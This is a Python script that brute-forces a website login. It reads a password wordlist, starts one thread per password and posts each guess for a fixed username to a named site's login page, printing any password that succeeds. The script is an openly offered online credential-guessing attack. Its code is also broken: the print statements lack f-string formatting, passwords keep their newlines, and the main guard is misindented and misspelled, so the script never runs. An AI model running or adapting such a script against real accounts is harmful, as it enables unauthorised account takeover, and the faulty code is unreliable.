import threading

import  requests

import time


def run_request(password_payload):
    import requests

    headers = {
        'Host': 'hackerxhunter.com',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://hackerxhunter.com/login.php',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '35',
        'Origin': 'http://hackerxhunter.com',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    data = 'uname=reymarkdivino&psw=' + password_payload + '&remember=on'
    response =requests.post('http://hackerxhunter.com/login.php', headers=headers, data=data, verify=False)
    output = response_text_checker(response, password_payload)
    return output


def response_text_checker(response, password_payload):
    if 'Successfully logged in' in response.text:
        print("!!! [PASSWORD FOUND {password_payload} ]")
    if 'Incorrect Username or Password' in response.text:
        print("INCORRECT: (password_payload}")


def main():
    start = time.perf_counter()
    path_of_password_payload_text_file = input("List of password payload: ").strip()
    list_of_threads = []
    with open(path_of_password_payload_text_file, "r") as a_file:
        for password in a_file:
            new_thread = threading.Thread(target=run_request, args=[password])
            new_thread.start()
            list_of_threads.append(new_thread)

        for thread in list_of_threads:
            thread.join()
    finish = time.perf_counter()
    print(f'\n\nFinished in {round(finish-start, 2)} second(s)\n')

    if __name__ == '_main_':
        main()
